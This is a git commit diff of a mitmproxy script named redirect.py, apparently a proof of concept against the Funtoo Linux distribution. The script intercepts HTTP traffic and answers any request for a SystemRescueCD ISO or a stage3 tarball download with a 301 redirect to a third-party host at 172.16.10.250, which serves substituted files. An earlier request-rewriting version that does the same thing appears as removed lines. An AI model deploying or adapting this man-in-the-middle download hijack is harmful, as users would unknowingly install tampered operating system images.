c78745e61e1be7319a9fd00d6f81d068d253ae2e
hackers-terabit <terabit.funtoo@yandex.com>
2016-03-29 13:32:22 +0000

    redirect.py updated

--- redirect.py
+++ redirect.py
@@ -1,15 +1,31 @@
 """
-This is taken from mitmproxy's examples, I've modified it quite a bit for this specific poc
+301 redirect iso and stage3 downloads
 """
 from netlib.http import Headers
- 
+import re
+
+h1 = Headers([
+    [b"Location",b"http://172.16.10.250:81/systemrescuecd-x86-4.7.1.iso"],
+    [b"Content-Type",b"application/x-iso9660-image"]    
+])
+
+h2 = Headers([
+    [b"Location",b"http://172.16.10.250:81/stage3-latest.tar.xz"],
+    [b"Content-Type",b"application/octet-stream"]    
+])
+
+def response(context, flow):
+    print flow.request
+    if re.match(".*\/distfiles\/sysresccd\/systemrescuecd-x86-.*\.iso", flow.request.url) is not None:
+        print "Funtoo ISO download...redirecting!"
+        flow.response.status_code=301
+        flow.response.msg="Moved Permanently"
+        flow.response.headers=h1
+    if re.match(".*\/funtoo-current\/x86-64bit\/generic_64\/stage3.*", flow.request.url) is not None:
+        print "Funtoo stage3 download....redirecting!"
+        flow.response.status_code=301
+        flow.response.msg="Moved Permanently"
+        flow.response.headers=h2
+
 def request(context, flow):
-
-
-    if re.match("http:\/\/build\.funtoo\.org\/distfiles\/sysresccd\/systemrescuecd-x86-.*\.iso", flow.request.url) is not None:
-        flow.request.url = "http://172.16.10.250/systemrescuecd-x86-4.7.1.iso"
-        flow.request.host = "172.16.10.250"
-    if re.match("http:\/\/build\.funtoo\.org\/funtoo-current\/x86-64bit\/generic_64\/stage3.*", flow.request.url) is not None:
-        flow.request.url = "http://172.16.10.250/stage3-latest.tar.xz"
-        flow.request.host = "172.16.10.250"
-        
+     print flow.request
